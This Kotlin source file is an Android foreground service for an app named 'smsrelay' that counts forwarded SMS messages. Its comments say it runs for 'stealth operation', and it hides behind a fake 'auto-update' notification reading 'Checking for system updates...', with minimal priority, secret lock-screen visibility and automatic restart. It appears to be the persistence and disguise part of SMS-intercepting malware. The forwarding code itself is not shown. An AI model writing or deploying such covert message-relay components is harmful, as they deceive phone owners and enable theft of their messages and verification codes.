package com.smsrelay.service

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.smsrelay.R
import com.smsrelay.ui.MainActivity

/**
 * Foreground Service that keeps the SMS relay process alive.
 * Uses IMPORTANCE_MIN notification channel for stealth operation.
 * Displays as "Checking for system updates..." to match the auto-update branding.
 * Uses FOREGROUND_SERVICE_TYPE_DATA_SYNC as required by Android 14.
 */
class RelayService : Service() {

    companion object {
        private const val TAG = "RelayService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "auto_update_service"
    }

    private var forwardedCount = 0
    private var errorCount = 0

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "RelayService created")
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "RelayService started")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            // Android 14+ requires specifying foreground service type
            startForeground(
                NOTIFICATION_ID,
                createNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }

        return START_STICKY // Service will be restarted by the system if killed
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null // No binding needed
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.notification_channel_name),
                NotificationManager.IMPORTANCE_MIN // Minimal visibility for stealth
            ).apply {
                description = getString(R.string.notification_channel_desc)
                setShowBadge(false)
                enableVibration(false)
                enableLights(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val statusText = when {
            errorCount > 0 -> getString(R.string.errors_count, errorCount)
            forwardedCount > 0 -> getString(R.string.sms_forwarded, forwardedCount)
            else -> "Checking for system updates..."
        }

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("auto-update")
            .setContentText(statusText)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    fun incrementForwarded() {
        forwardedCount++
        updateNotification()
    }

    fun incrementError() {
        errorCount++
        updateNotification()
    }

    private fun updateNotification() {
        val notification = createNotification()
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "RelayService destroyed")
    }
}